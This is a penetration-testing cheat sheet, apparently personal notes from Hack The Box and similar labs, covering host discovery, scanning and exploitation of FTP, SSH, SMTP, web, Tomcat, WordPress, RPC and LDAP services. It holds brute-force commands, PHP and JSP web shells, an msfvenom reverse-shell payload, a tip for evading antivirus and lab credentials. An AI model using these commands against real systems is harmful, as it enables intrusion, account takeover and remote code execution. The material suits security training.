
### [OSINT](#)
- https://academy.hackthebox.com/course/preview/osint-corporate-recon

### [HOST DISCOVERY](#)

**Host Discovery by arp-scan**

- Scan all valid IP addresses on your local networks.
    - `arp-scan -l` / `arp-scan --localnet`
    - `arp-scan -l -I <network interface>` / `arp-scan --localnet --interface=<network interface>`
        - `arp-scan -l -I eth0`
- Scan specific subnet / IP range
    - `arp-scan <subnet>`

**Host Discovery by Netdiscover** 
- `sudo netdiscover -r 192.168.204.0/24` 

**Host Discovery by NMAP**

- No Port scan (Ping Sweep, -sn/sP) 
        - -sn can be combined with -p* options

    - When Privileged user uses for local network - ARP request are used
            - `sudo nmap -PR -sn TARGETS` (-PR indicates that you only want an ARP scan)

    - When Privileged user uses for outside local network - {ICMP echo requests, ICMP timestamp requests, TCP SYN (Synchronize) to port 443, TCP ACK (Acknowledge) to port 80 } are used
        - by ARP Scan
            - `sudo nmap -PR -sn TARGETS` (-PR indicates that you only want an ARP scan)
        - by ICMP echo Scan
            - `sudo nmap -PE -sn 10.10.68.220/24` (To use ICMP echo request to discover live hosts, add the option -PE)
        - by ICMP Timestamp 
            - `sudo nmap -PP -sn 10.10.68.220/24`
        - by ICMP Address mask scan
            -  `sudo nmap -PM -sn 10.10.68.220/24`
        - by TCP SYN Scan (SYN ->, <- SYN/ACK, -> RST)
            - `sudo nmap -PS -sn 10.10.68.220/24`
        - by TCP ACK scan (ACK -> and ACK ->, <- RST)
            -  `sudo nmap 192.168.29.0/24 -sn -n -PA`

    - When Unprivileged user uses - 3 way handhsake happens by sending SYN packets
        
        - by TCP SYN Scan (SYN ->, <- SYN/ACK, -> ACK)
            - `nmap -sn 10.10.68.220/24`
            - `nmap -sn 208.109.192.1-255`
            - `nmap -sn 208.109.192.*`
            - `nmap -sP 208.109.*.*`
            - `nmap -sn 208.109.193.* --exclude 208.109.193.5` 
            - `nmap -sn 192.168.46.0/24`


### [PORT & SERVICE SCANNING](#)
```
- Normal scan
    - `nmap <ip>` / `nmap -p <port> <ip>` / `nmap -p- <ip>` / `nmap --top-ports n <ip>`
- TCP SYN Stealth Scan 
    - `nmap -sS <ip>` , `nmap -sS <subnet>` (SYN Scan)
- No Ping Scan for windows (treat all host online and skip host discovery)
    - `nmap -Pn <ip>` , `nmap -Pn <subnet>`
- NULL Scan (does not even include SYN,ACK)
    - `nmap -sN <ip>`
- Using public dns
    - `nmap --dns-servers 8.8.4.4,8.8.8.8 -sL <ip>`
- UDP Scan
    - `nmap -sU <ip>`

- Service, Verion Scanning
    - Normal service version scan
        - `nmap -sV <ip>` / `nmap -sV -p`

- Tracing newtwork packet
    - `nmap -vv -n -A -T4 -Pn --packet-trace 192.168.29.193`
```
- Basic Scan
```
nmap -sC -sV <IP> -v -Pn --open
```
- All Port Scan
```
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.184
```
- Scan for ports found
```
nmap -sV -sC -p 21,22,80,135,139,445,5040,5666,6063,6699,7680,8443 -oA scans/tcpscripts 10.10.10.184
```
- UDP Port Scan (-sU)
```
nmap -sU -p- --min-rate 10000 --open 10.10.11.248
```
- Agressive Complete Scan
```
nmap -v -Pn -p- -A -T5 10.11.1.111
```

### [ENUMERATING & EXPLOITING SERVICES](#)

#### 21 FTP

```
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.11.1.111
```
**Check for FTP Version** 
>(ProFTPD, VSFTPD etc..) Version might be old and vulnerable for which public exploit might exist

**Check for Anonymous login if allowed** 
>ftp 192.60.4.3 - Provide blank for password while making FTP connection

**Brute Force to get access**
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.60.4.3 ftp
```
```
nmap 192.60.4.3 --script ftp-brute --script-args userdb=/users -p 21
```
**Passive Mode**

At times connection gets hang, in this situation we can use passive mode

Ex: On entering ls, it just hangs. I switch to passive mode, and it worked
```
ftp> ls
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (10,10,10,240,208,31).
125 Data connection already open; Transfer starting.
02-19-21  03:06PM               103106 10.1.1.414.6453.pdf
02-19-21  03:06PM               656029 28475-linux-stack-based-buffer-overflows.pdf
02-19-21  12:55PM              1802642 BHUSA09-McDonald-WindowsHeap-PAPER.pdf
02-19-21  03:06PM              1018160 ExploitingSoftware-Ch07.pdf
08-08-20  01:18PM               219091 notes1.pdf
08-08-20  01:34PM               279445 notes2.pdf
08-08-20  01:41PM                  105 README.txt
02-19-21  03:06PM              1301120 RHUL-MA-2009-06.pdf
```
**Grab All files**
```
ftp> bin
ftp> prompt off
ftp> mget *
```

**Some Commands**

| Command  | Usage |
| ------------- | ------------- |
| ls  | list files |
| get  | Get a file from the remote computer. |
| mget  | Download everything |
| put  | Send/upload one file. |

********************************************************************************

#### 22 SSH
```
nmap 192.238.103.3 -p 22 -sV 
```
**Check OpenSSH version**
>Note that only openssh versions less than 7 are vulnerable

**Make SSH connection** 
- `ssh root@192.238.103.3`
- `ssh 192.168.204.134 -okexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-dss -c aes128-cbc`
- `ssh -i ssh-key user@192.168.204.132 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa`

**Brute Force**
```
hydra -l student -P /usr/share/wordlists/rockyou.txt 192.72.183.3 ssh
nmap 192.72.183.3 -p 22 --script ssh-brute --script-args userdb=/root/user
```
**Cracking private key/id_rsa**
- This key cannot be cracked until we have turned it into a hash that John can crack. we can do that using `ssh2john.py`
```
$ /usr/share/john/ssh2john.py id_rsa > id_rsa.txt
```
- Crack it
```
john id_rsa.txt --wordlist=rockyou.txt
```
********************************************************************************

#### 23 Telnet
```
telnet 10.11.1.111 23
```
**Grab Telnet Banner**
```
nc -vn {IP} 23
```
**Telnet into a machine**
********************************************************************************

#### 25 SMTP
```
nmap -p25,465,587 --script=smtp-commands,smtp-open-relay,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 10.10.10.10 -v
```
**Version Info**
```
telnet example.com 587
```
**Find Mail servers of an organization**
> The result is a list of all systems responsible for incoming mail for that domain
```
dig +short mx google.com
```
**UserName Enumeration**
- Enumerate uses with `smtp-user-enum`
```
smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $ip
smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt  -t $ip
```
**Connect with SMTP**
```
telnet 192.72.183.3 25

# connect with SMTPS
openssl s_client -crlf -connect {IP}:465
openssl s_client -starttls smtp -crlf -connect {IP}:587
```
**Brute Force**
```
hydra -P /usr/share/wordlists/rockyou.txt 192.72.183.3 smtp -V
```
**Enumeration Commands**
| Command  | Usage |
| ------------- | ------------- |
| HELO  | command to start conversation identifying the sender server and is generally followed by its domain name. |
| EHLO  | An alternative command to start the conversation|
| VRFY  | Verify whether a particular email address or username actually exists on server.|
| EXPN  | This command displays the actual mailing address for aliases and mailing lists. |
| MAIL FROM | It identifies the sender of the email |
| RCPT TO | It identifies the recipient of the email |
```
$ telnet 10.0.0.1 25
Trying 10.0.0.1...
Connected to 10.0.0.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello [10.0.0.99], pleased to meet you
VRFY root
250 Super-User <root@myhost>
EXPN root
250 Super-User <root@myhost>
MAIL FROM:root
250 root... Sender ok
RCPT TO:root
250 root... Recipient ok
```

**Mail LFI to RCE Exploit**
[Beep HTB](https://www.youtube.com/watch?v=XJmBpOd__N8&t=963s)
1. Access the SMTP server.
```
telnet [IP] 25
```
2. Confirm that an assumed user is on the box. This is the user we'll send an email to to exploit the LFI in the web application.
```
VRFY [user]@localhost
```
3. Create a new mail to the confirmed user on the box.
    - Note that the 'valid.domain.com' section is the value of what is returned from the 'HELO localhost' command for the SMTP server.
    - Note that you need a CRLF after the last line with a period to complete the email and send it to the recipient.
```
HELO localhost
MAIL FROM:example@domain.com
RCPT TO:[valid_user]@[valid.domain.com]
DATA
This is a test message.
<?php echo system($_REQUEST['brwn']); ?>

.
```
4. Go to the web application and abuse the LFI vulnerability to navigate to the file location where our mail was sent and stored to execute the PHP script.
```
.../var/mail/[user]
```
5. If we're able to navigate here with our LFI, then we have command execution through the 'brwn' parameter.
```
.../var/mail/[user]&rbwn=[command]
```

**Helpful Resources**
[HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp)
********************************************************************************

#### 53 DNS
**DNS Enumeration**
```
#host
host www.megacorpone.com
host -t mx megacorpone.com
host -t txt megacorpone.com

# nslookup
nslookup amazon.in
nslookup -type=MX amazon.in

# dig
dig amazon.in
dig mx amazon.in
dig +short mx dtcc.com

# dnsrecon
dnsrecon -d amazon.in

# dnsenum (will enumerate every possible thing)
dnsenum amazon.in
```

**DNS Zone Transfer attack**
```
root@kali# dig axfr @10.10.10.175 sauna.htb
; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> axfr @10.10.10.175 sauna.htb
; (1 server found)
;; global options: +cmd
; Transfer failed.

root@kali# dig axfr @10.10.10.175 egotistical-bank.local
; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> axfr @10.10.10.175 egotistical-bank.local
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

```
host -l sequel.htb 10.10.11.202

```
#### 69 TFTP



#### 80 HTTP

###### Basic Enumeration

**Techstack Enumeration**
```
whatweb
```
**Basic Directory Enumeration**

```
# I found best results with feroxbuster, its also fast and gave more results than other

feroxbuster -u http://10.10.10.63/

# No results?? feroxbuster by default uses the SecLists raft-medium-directories.txt wordlist, which is a pretty good approximation

Try another dirbuster directory-list-2.3-medium.txt list

feroxbuster -u http://10.10.10.63/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

# Also add extensions with -x flag

feroxbuster -u http://10.10.10.63 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html

# Need Authentication??

feroxbuster -u http://10.10.11.243 -H 'Authorization: Basic YWRtaW46YWRtaW4='

feroxbuster --cookies "" --url http://10.10.11.220/gallery#/

# Try Other tools gobuster, dirbuster

gobuster -u http://10.10.93.218/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt dir 

gobuster -u http://10.10.10.63:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html

dirbuster -u https://streamio.htb -t 20 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php -r dirscans/streamioscan

# Sometimes you should run on specfic dir, fir example I didnt got admin/master.php at first, but when ran on /admin I got it

dirbuster -u https://streamio.htb/admin -t 20 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php -r dirscans/streamioscan

# you may use diff wordlist but the above one gives perfect results in most cases

# https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-medium-files-lowercase.txt
# https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/directory-list-2.3-big.txt


```

**Subdomain Enumeration**

[subdomains-top1million-5000.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt)
```
wfuzz -u http://10.10.11.177 -H "Host: FUZZ.siteisup.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 1131

wfuzz -u http://10.10.11.187 -H "Host: FUZZ.flight.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hw 530 

# --hh is chars and --hw is words
```
ffuf
```
ffuf -ic -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  -u http://flight.htb -H 'HOST: FUZZ.flight.htb' -fs 7069

ffuf -c -r -w "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt" -u "http://FUZZ.flight.htb/"

# -fs is size ie words
```
Dnsenum
```
dnsenum --dnsserver 10.10.10.248 -f /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -o scans/dnsenum-bitquark-intelligence.htb intelligence.htb dnsenum VERSION:1.2.6
```

**Discover more query Parameter**

Below was authenticate page hence need to provide cookie
```
wfuzz -u https://streamio.htb/admin/?FUZZ= -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=jtde06u71uq4t7pvs59b8iis1o" --hh 1678
```

**get php code using filter**

I’ll use a PHP filter to get the source for master.php by visiting https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php


**Downloading Git Repo**

python git-dumper

Note that you wont see all files in browser, you need to dump and analyse .git
```
# pip is a general-purpose package installer for both libraries and apps with no environment isolation. pipx is made specifically for application installation, as it adds isolation yet still makes the apps available in your shell

pipx install git-dumper
git-dumper https://example.com/.git ./dumped
```

gitdumper.sh

```
wget https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh
chmod +x gitdumper.sh

sudo bash./gitdumper http://website.com/.git ~/website
```

```
sudo bash ./gitdumper.sh https://helpdeskz.com/.git/ .              
```

**Mass Download - Wget**
```
┌──(kali㉿kali)-[~/Downloads/pdfs]
└─$ cat links | tail -3                                                              
http://intelligence.htb/documents/2021-03-21-upload.pdf
http://intelligence.htb/documents/2021-03-25-upload.pdf
http://intelligence.htb/documents/2021-03-27-upload.pdf
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads/pdfs]
└─$ wget -i /home/kali/Downloads/pdfs/links
```


#### WebDav 
**ENUMERATION**
- Http methods supported by /webdav
    - `nmap -p 80 -sV 10.5.17.75 --script http-methods --script-args http-methods.url-path=/webdav/`
- Webdav scan
    - `nmap -p 80 -sV 10.5.17.75 --script http-webdav-scan --script-args http-methods.url-path=/webdav/`
- Checking files that can be uploaded
    - `davtest -auth bob:password_123321 -url http://10.5.27.32`

**EXPLOITATION**

- Connectiing to site
    - `curl http://192.245.191.3/webdav/ --user "admin:angels"` / `curl http://192.245.191.3/secure/ --user "admin:brittany"`
- Connecting Webdav
    - `davtest -auth admin:angels -url http://192.245.191.3/webdav/`
    
- Uploading files
    - `curl http://192.49.74.3/webdav/ --user "admin:angels" --upload-file /root/backdoor.asp`
- Downloading files

- Uploading/Downloading/Deleting files to /Webdav
    - `cadaver http://10.5.27.32/webdav`
        - `put /usr/share/webshells/asp/webshell.asp `
        - `delete webshell.asp`

- Uploading files using Metasploit
    - `use exploit/windows/iis/iis_webdav_upload_asp` > `set RHOSTS 10.5.26.116` > `set PATH /webdav/newshell.asp` > `set httpUsername bob` > `set httppassword password_123321` > `set LHOST 10.10.12.2` >  `set LPORT 1234` > `exploit`

#### Wordpress 

**ENUMERATION**

- /robots.txt
    -  `/robots.txt`- presence of the `/wp-admin` and `/wp-content` will confirm we are dealing with wordpress.`/wp-admin` Typically attempting to browse to the `wp-admin` directory will redirect us to the `wp-login.php`, `wp-content/plugins` This folder is helpful to enumerate vulnerable plugins. `wp-content/themes` These files should be carefully enumerated as they may lead to RCE.

- Inpect Source Code
    - grepping wordpress to confirm its wordpress 
        - `curl -s http://blog.inlanefreight.local | grep WordPress`
    - grepping themes on pages
        - `curl -s http://blog.inlanefreight.local/ | grep themes`
    - grepping plugins on pages
        - `curl -s http://blog.inlanefreight.local | grep plugins `

- Plugins and themes
    - `wpscan --url http://10.10.207.150/blog/ -e vp,u`

- Enumerating Users
    - Observing error on login page `/wp-login.php`. for invalid user and password
    - wpscan - `wpscan --url http://10.10.207.150/blog/ -e vp,u`

**ATTACKS**

- Themes with known vulnerabilities

- Plugins with known vulnerabilities

- Brute Force Login Page
    - `wpscan --url http://10.10.207.150/blog/ --usernames admin --passwords rockyou.txt --max-threads 50`
    - `sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local`

- Remote code execution via the theme editor.

- One Way
    - Click on Appearance on the side panel and select Theme Editor. Click on Select after selecting the theme, and we can edit an uncommon page such as `404.php `to add a web shell.
        - Add php Code: `system($_GET[0]);`
    - Click on Update File at the bottom to save. We know that WordPress themes are located at /wp-content/themes/<theme name>. We can interact with the web shell via the browser or using `cURL.`
        - `curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id`




    - Enumerate Plugins and Users on wordpress
        - `wpscan --url http://10.10.207.150/blog/ -e vp,u`
    - Brute Force for any username (in this case admin)
        - `wpscan --url http://10.10.207.150/blog/ --usernames admin --passwords rockyou.txt --max-threads 50`

#### Tomcat

**Discovery/Footprinting**
    -  Server header in the HTTP response. 
    - 404, Requesting an invalid page should reveal the server and version.
    -  Another method of detecting a Tomcat server and version is through the /docs page. This is the default documentation page, which may not be removed by administrators. 
        - `curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat `

- General Folder Structure
```
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
    └── Catalina
        └── localhost
```
- The `bin` folder stores scripts and binaries needed to start and run a Tomcat server. 
- The `conf` folder stores various configuration files used by Tomcat. - The `tomcat-users.xml` file stores user credentials and their assigned roles. The tomcat-users.xml file is used to allow or disallow access to the `/manager` and `/host-manager` admin pages
- The `lib` folder holds the various JAR files needed for the correct functioning of Tomcat. 
- The `logs` and `temp` folders store temporary log files. 
- The `webapps` folder is the default webroot of Tomcat and hosts all the applications. 
- The `work` folder acts as a cache and is used to store data during runtime.

Each folder inside `webapps` is expected to have the following structure.
```
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
    ├── jsp
    |   └── admin.jsp
    └── web.xml
    └── lib
    |    └── jdbc_drivers.jar
    └── classes
        └── AdminServlet.class  
```
- `WEB-INF/web.xml` - The most important file among these is WEB-INF/web.xml, which is known as the deployment descriptor. This file stores information about the routes used by the application and the classes handling these routes. The web.xml descriptor holds a lot of sensitive information and is an important file to check when leveraging a `Local File Inclusion (LFI) `
- `WEB-INF/classes` - All compiled classes used by the application should be stored in the WEB-INF/classes folder. These classes might contain important business logic as well as sensitive information. Any vulnerability in these files can lead to total compromise of the website. 
- The `lib` folder stores the libraries needed by that particular application.
- The `jsp` folder stores Jakarta Server Pages (JSP), formerly known as JavaServer Pages

Here’s an example `web.xml` file.

```
<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">

<web-app>
  <servlet>
    <servlet-name>AdminServlet</servlet-name>
    <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
  </servlet>

  <servlet-mapping>
    <servlet-name>AdminServlet</servlet-name>
    <url-pattern>/admin</url-pattern>
  </servlet-mapping>
</web-app> 
```
- The `web.xml` configuration above defines a new servlet named `AdminServlet` that is mapped to the class `com.inlanefreight.api.AdminServlet`. Java uses the dot notation to create package names, meaning the path on disk for the class defined above would be:
    - `classes/com/inlanefreight/api/AdminServlet.class`
- Next, a new servlet mapping is created to map requests to `/admin` with `AdminServlet`. This configuration will send any request received for /admin to the AdminServlet.class class for processing. 

**Enumeration**

- After fingerprinting the Tomcat instance, unless it has a known vulnerability, we'll typically want to look for the `/manager and the /host-manager pages`. We can attempt to locate these with a tool such as `Gobuster` or just browse directly to them.
    - ` gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt`

- We may be able to either log in to one of these using weak credentials such as `tomcat:tomcat, admin:admin, etc`. If these first few tries don't work, we can try a `password brute force attack against the login page`, 

- If we are successful in logging in, we can upload a Web Application Resource or Web Application ARchive (WAR) file containing a `JSP web shell `and obtain `remote code execution` on the Tomcat server.

**Attack**

- Tomcat Manager - Login Brute Force
    - As discussed in the previous section, if we can access the `/manager or /host-manager endpoints`, we can likely achieve `remote code execution` on the Tomcat server. 
    - Let's start by b`rute-forcing the Tomcat manager` page on the Tomcat instance. We can use the `auxiliary/scanner/http/tomcat_mgr_login` Metasploit module for these purposes, `Burp Suite Intruder` or `any number of scripts `to achieve this.
        - Let's say a particular Metasploit module (or another tool) is failing or not behaving the way we believe it should. We can always use Burp Suite or ZAP to proxy the traffic and troubleshoot. To do this, first, `fire up Burp Suite` and then set the PROXIES option like the following
            - msf6 auxiliary(scanner/http/tomcat_mgr_login) > `set PROXIES HTTP:127.0.0.1:8080`
    - We can also use Python script, This is a very straightforward script that takes a few arguments. We can run the script with -h to see what it requires to run
        - https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce

- Tomcat Manager - WAR File Upload
    - A `WAR, or Web Application Archive`, is used to quickly deploy web applications and backup storage. Many Tomcat installations provide a GUI interface to manage the application. This interface is available at /manager/html by default, which only users assigned the manager-gui role are allowed to access. Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file) and compromise the application.
    - After performing a brute force attack and answering questions 1 and 2 below, browse to http://web01.inlanefreight.local:8180/manager/html and enter the credentials.
    -  A WAR file can be created using the zip utility. A JSP web shell such as below can be downloaded and placed within the archive.
        - https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
    - Click on Browse to select the .war file and then click on Deploy.This file is uploaded to the manager GUI, after which the /backup application will be added to the table.
    - Browsing to http://web01.inlanefreight.local:8180/backup/cmd.jsp will present us with a web shell that we can use to run commands on the Tomcat server. From here, we could upgrade our web shell to an interactive reverse shell and continue. we can interact with this web shell via the browser or using cURL on the command line. Try both!
        -`curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id`
    - CleanUp - To clean up after ourselves, we can go back to the main Tomcat Manager page and click the Undeploy button next to the backups application after, of course, noting down the file and upload location for our report, which in our example is /opt/tomcat/apache-tomcat-10.0.10/webapps. If we do an ls on that directory from our web shell, we'll see the uploaded backup.war file and the backup directory containing the cmd.jsp script and META-INF created after the application deploys. Clicking on Undeploy will typically remove the uploaded WAR archive and the directory associated with the application.
    - Another Way
        - We could also use `msfvenom` to generate a malicious WAR file. The payload `java/jsp_shell_reverse_tcp` will execute a reverse shell through a JSP file. Browse to the Tomcat console and deploy this file. Tomcat automatically extracts the WAR file contents and deploys it.
            - `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war`
        - Start a `Netcat` listener and click on /backup to execute the shell.
            - `nc -lnvp 4443`
        - The `multi/http/tomcat_mgr_upload` Metasploit module can be used to automate the process shown above
    - Below mentioned JSP web shell is very lightweight (under 1kb) and utilizes a Bookmarklet or browser bookmark to execute the JavaScript needed for the functionality of the web shell and user interface. Without it, browsing to an uploaded cmd.jsp would render nothing. This is an excellent option to minimize our footprint and possibly evade detections for standard JSP web shells (though the JSP code may need to be modified a bit, change `FileOutputStream(f);stream.write(m);o="Uploaded`:
 to `FileOutputStream(f);stream.write(m);o="uPlOaDeD`:
).
        - https://github.com/SecurityRiskAdvisors/cmd.jsp
        - The web shell as is only gets detected by 2/58 anti-virus vendors.

#### Jenkins

##### Command Execution & Shell

Execution via Job - https://0xdf.gitlab.io/2022/04/14/htb-jeeves.html#execution-via-job-1

Execution via Script Console - https://0xdf.gitlab.io/2022/04/14/htb-jeeves.html#execution-via-script-console-2

Shell - https://0xdf.gitlab.io/2022/04/14/htb-jeeves.html#shell

#### 88 Kerberos

#### 135 RPC

```
# Anonymous session with RPC
rpcclient -U "" -N 10.10.10.161 

# rpcclient commands
rpcclient -U "" 10.11.1.111
    srvinfo
    enumdomusers
    getdompwinfo
    querydominfo
    netshareenum
    netshareenumall

```
```
# Enumerate domain users
rpcclient $> enumdomusers

# Enumerate domain groups
rpcclient $> enumdomgroups
```
```
# query group
rpcclient $> querygroup <RID>

rpcclient $> querygroup 0x200          
        Group Name:     Domain Admins     
        Description:    Designated administrators of the domain
        Group Attribute:7              
        Num Members:1                  

# query group members
rpcclient $> querygroupmem 0x200
        rid:[0x1f4] attr:[0x7]

# then query user
rpcclient $> queryuser 0x1f4            
        User Name   :   Administrator
        Full Name   :   Administrator
        Home Drive  :   
        Dir Drive   :      
        Profile Path:      
        Logon Script:
        Description :   Built-in account for administering the computer/domain
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Mon, 07 Oct 2019 06:57:07 EDT
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 31 Dec 1969 19:00:00 EST
        Password last set Time   :      Wed, 18 Sep 2019 13:09:08 EDT
        Password can change Time :      Thu, 19 Sep 2019 13:09:08 EDT
        Password must change Time:      Wed, 30 Oct 2019 13:09:08 EDT
        unknown_2[0..31]...
        user_rid :      0x1f4
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000031
        padding1[0..7]...
        logon_hrs[0..21]...

```
```
# Enumerate domain users
net rpc user  -U forest.htb.local/svc-alfresco%'s3rvice' -S 10.10.10.161
```
**Reset Password of User**

This is very useful when you need to reset password of user form linux since you dont have shell on windows machine
```
# use the command setuserinfo2

└─$ rpcclient -U "support" 10.10.10.192 
Password for [WORKGROUP\support]:

# note password not machin policy will give such error

rpcclient $> setuserinfo2 audit2020 23 '0xdf'
result: NT_STATUS_PASSWORD_RESTRICTION
result was NT_STATUS_PASSWORD_RESTRICTION

# password that is according to policy will be accepted silently

rpcclient $> setuserinfo2 audit2020 23 '0xdf!!!'
rpcclient $> 
```
This can also be done in one line
```
rpcclient -U 'blackfield.local/support%#00^BlackKnight' 10.10.10.192 -c 'setuserinfo2 audit2020 23 "0xdf!!!"'
```
[More](https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#password-reset-over-rpc)
[More](https://room362.com/posts/2017/reset-ad-user-password-with-linux/)

#### 161 SNMP

Note that it is UDP, use -sU in nmap scan
```
nmap -sU -p- --min-rate 10000 --open 10.10.11.248
```
[What is SNMP? and How SNMP Works? ](https://blog.domotz.com/product-bytes/how-snmp-works-what-is-snmp/)

Simple Network Management Protocol (SNMP) is an application layer protocol for monitoring the network, detecting network faults, and sometimes even configuring devices remotely. many network devices like routers, switches, servers, hubs, bridges, workstations, printers, modem racks, and other network components support these protocols.

SNMP comprises of 3 components `SNMP Manager`, `SNMP Agent` and `(MIB) Management Information Base`. The SNMP Manager is a centralized administrative computer for monitoring the network, The SNMP agent is installed on the device which feeds information to the managers through SNMP, The agents create variables out of the data and organize them into hierarchies, these hierarchies are stored in MIB database.

```
1. GetRequest  - The SNMP manager sends this message to request data from the SNMP agent.
2. GetNextRequest - The SNMP manager can request data continuously until no more data is left
3. SetRequest - The SNMP manager uses this to set the value of an object instance on the SNMP agent.
4. Response - The agent sends these when they get a request from the manager
5. Trap - The agent sends these messages when a fault occurs. Furthermore, the SNMP manager doesn’t need to make any requests.
6. InformRequest - The manager can confirm the receipt of a trap message.
```

SNMP works with three different versions of the protocol.

1. `SNMPv1`:  This was the first implementation, It uses community strings for authentication and UDP only.
2. `SNMPv2c`:  This version improved support for efficiency and error handling.
3. `SNMPv3 `: This version of the protocol improves security and privacy.



SNMP `Public` Community String

[About SNMP Strings](https://blog.domotz.com/product-bytes/snmp-community-strings/)

An SNMP community string is a simple password that SNMP uses to control access to devices, and the passwords involved are known as SNMP community strings.

Many `SNMPv1` and `v2c` devices are shipped with a `public` read-only community string. Most network administrators customize the community strings in the device settings as a best practice.

1. Dump SNMP data
2. grep for process id

https://0xdf.gitlab.io/2024/05/11/htb-monitored.html#snmp---udp-161

```
snmpwalk -v 2c -c public monitored.htb | tee snmp_data
```
grep for process id, in this case dump has a sudo process id, similary there can be other for diff dump
```
grep "\.1312 = " snmp_data
```

We found username and password in dump



#### 379, 636 LDAP

**ADCS**

check for ADCS always in case of ldapSSL, This can be done by uploading Certify or remotely with Certipy. Certiy is much better
```
certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout
```

**NamingContext**
```
ldapsearch -x  -H ldap://10.10.10.175 -s base namingcontexts
```
Use this Naming Context for example `DC=EGOTISTICAL-BANK,DC=LOCAL` to enumerate domain

**Get All info**
```
ldapsearch -x  -H ldap://10.10.10.172 -b "DC=MEGABANK,DC=LOCAL" > ldap-anonymous.out
```

**Enumerate Users**
```
ldapsearch -x  -H ldap://10.10.10.172 -b "DC=MEGABANK,DC=LOCAL" '(objectClass=Person)' sAMAccountName | grep sAMAccountName
```
**Search Password**

Search Password in query output of '(objectClass=person)'
```
ldapsearch -x -H ldap://10.10.10.182 -b  "DC=cascade,DC=local" '(objectClass=person)' > ldap-users-info
```

In case there is any program/service making use of LDAP for its operation with user as 'ldap' as in below case it was support//ldap, then we can use ldapsearch to search for password, as we got 

info: Ironside47pleasure40Watchful

name: support

```
ldapsearch -H ldap://10.10.11.174 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
```
```
# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
